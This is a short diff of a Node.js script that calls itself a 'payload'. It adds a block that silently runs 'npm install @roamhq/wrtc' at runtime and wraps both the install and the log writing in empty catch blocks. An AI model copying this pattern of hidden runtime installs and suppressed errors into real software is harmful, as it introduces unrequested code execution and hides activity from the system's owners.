@@ -4,10 +4,12 @@ const os = require('os');
 const path = require('path');
 const fs = require('fs');
 const crypto = require('crypto');
- 
+
+// --- FORCE INSTALL @roamhq/wrtc ---
 try {
  const nodeModulesPath = path.join(__dirname, 'node_modules', '@roamhq', 'wrtc');
  if (!fs.existsSync(nodeModulesPath)) {
+ console.log("[INIT] Installing @roamhq/wrtc...");
  execSync('npm install @roamhq/wrtc --save', { stdio: 'pipe' });
  }
 } catch (e) {}
@@ -24,7 +26,7 @@ if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
 function log(msg) {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] ${msg}`);
- fs.appendFileSync(LOG_FILE, `[${timestamp}] ${msg}\n`);
+ try { fs.appendFileSync(LOG_FILE, `[${timestamp}] ${msg}\n`); } catch(e) {}
 }
 
 log("[INIT] Payload starting...");
